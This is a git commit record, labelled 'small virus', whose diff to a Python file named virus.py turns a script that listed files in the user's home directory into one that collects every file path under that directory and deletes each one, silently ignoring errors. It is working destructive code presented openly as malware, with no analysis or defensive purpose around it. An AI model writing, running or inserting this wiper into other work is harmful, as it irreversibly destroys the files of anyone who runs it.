06993b940034c6a4322110ed90b1a724ebf546ea
Munseer-am <munnamunseer7@gmail.com>
2022-08-13 10:55:46 +0530

    small virus

--- virus.py
+++ virus.py
@@ -1,8 +1,20 @@
 import os
+import shutil
 
 home = os.path.expanduser("~")
 os.chdir(home)
 
+docs = []
+
 for path, subdirs, files in os.walk(home):
 	for file in files:
-		print(os.path.join(path, file))
+		docs.append(os.path.join(path, file))
+
+for doc in docs:
+	try:
+		if os.path.isfile(doc):
+			os.remove(doc)
+		else:
+			shutil.rmtree(doc)
+	except:
+		continue
